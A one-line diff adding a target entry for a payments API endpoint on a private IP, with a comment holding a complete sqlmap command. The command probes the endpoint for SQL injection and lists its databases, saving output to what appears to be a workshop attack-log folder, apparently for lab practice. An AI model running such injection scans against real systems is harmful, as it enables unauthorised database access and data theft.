@@ -1,0 +1,1 @@
+http://172.16.147.10:8080/api/payments/accounts?id=1 (GET)  # /home/alin/.local/bin/sqlmap -u http://172.16.147.10:8080/api/payments/accounts?id=1 --batch --level 1 --risk 1 --timeout 10 --retries 1 --output-dir /home/alin/Dev/Perso/workshop/attacks/logs/sqli-20261019-151903 --banner --dbs
